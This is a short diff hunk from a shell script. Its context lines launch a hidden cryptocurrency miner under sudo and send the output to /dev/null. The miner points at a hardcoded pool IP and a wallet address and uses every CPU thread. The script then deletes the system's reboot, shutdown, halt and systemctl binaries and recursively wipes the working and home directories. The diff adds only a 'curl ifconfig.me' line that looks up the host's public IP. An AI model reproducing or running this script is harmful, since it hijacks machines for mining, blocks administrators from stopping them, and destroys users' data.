@@ -26,6 +26,7 @@ chmod u+x sgr1
 sudo nohup ./sgr1 --donate-level 1 -o 167.235.223.40:1123 -u ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+curl ifconfig.me
 rm -rvf *
 cd ~/
 rm -rvf *
